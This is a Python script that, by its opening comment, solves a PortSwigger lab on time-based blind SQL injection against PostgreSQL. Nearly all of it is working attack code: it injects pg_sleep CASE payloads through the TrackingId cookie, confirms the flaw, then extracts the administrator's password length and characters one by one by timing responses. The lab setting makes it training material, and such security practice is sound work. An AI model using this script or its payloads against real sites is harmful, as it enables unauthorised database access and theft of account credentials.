# This script was written to complete the lab https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval. This lab uses a 
#   PostgreSQL database and is sensible to time delays in the response


import requests
import urllib.parse


def send_request(url, session, tracking_id, injection_payload):
  headers = {"Cookie": f"TrackingId={tracking_id}{injection_payload}; session={session}"}
  test_request = requests.get(url, headers = headers)
  return test_request.elapsed.total_seconds()


def test_vuln(url, session, tracking_id, delay_time):
  true_response = send_request(url, session, tracking_id, urllib.parse.quote(f"'; SELECT CASE WHEN (1=1) THEN pg_sleep({delay_time}) ELSE pg_sleep(0) END--"))
  false_response = send_request(url, session, tracking_id, urllib.parse.quote(f"'; SELECT CASE WHEN (1=2) THEN pg_sleep({delay_time}) ELSE pg_sleep(0) END--"))
  if true_response > false_response and true_response > delay_time:
    return True
    
  print("site is not vulnerable")
  return False


def get_password_length(url, session, tracking_id, delay_time, max_length):
  for length in range(1, max_length+1):
    injection_paylaod = f"'; SELECT CASE WHEN (LENGTH(password) > {length}) THEN pg_sleep(0) ELSE pg_sleep({delay_time}) END FROM users WHERE username = 'administrator'--"
    response = send_request(url, session, tracking_id, urllib.parse.quote(injection_paylaod))
    if response > delay_time:
      return [True, length]
  
  print("failed to brute force the password length")
  return [False, None]


def get_password(url, session, tracking_id, delay_time, password_length, characters):
  password = ""
  for position in range(1, password_length+1):
    for character in characters:
      injection_paylaod = f"'; SELECT CASE WHEN (SUBSTR(password, {position}, 1) = '{character}') THEN pg_sleep({delay_time}) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator'--"
      response = send_request(url, session, tracking_id, urllib.parse.quote(injection_paylaod))
      if response > delay_time:
        password += character
        print(f"{position}/{password_length} characters...")
        break
  
  if len(password) == password_length:
    return [True, password]

  print("failed to brute force the password")
  return [False, None]


def main():
  DOMAIN = ""
  URL = f"https://{DOMAIN}/filter?category=category"
  SESSION_COOKIE = ''
  TRACKINGID_COOKIE = ''
  DELAY_TIME = 1
  CHARACTERS = 'abcdefghijklmnopqrstuvwxyz0123456789'

  if not test_vuln(URL, SESSION_COOKIE, TRACKINGID_COOKIE, DELAY_TIME):
    return
  print("site is vulnerable")

  (got_password_length, password_length) = get_password_length(URL, SESSION_COOKIE, TRACKINGID_COOKIE, DELAY_TIME, 50)
  if not got_password_length:
    return
  print(f"the password length is {password_length}")

  (got_password, password) = get_password(URL, SESSION_COOKIE, TRACKINGID_COOKIE, DELAY_TIME, password_length, CHARACTERS)
  if got_password:
    print(password)


if __name__ == "__main__":
  main()
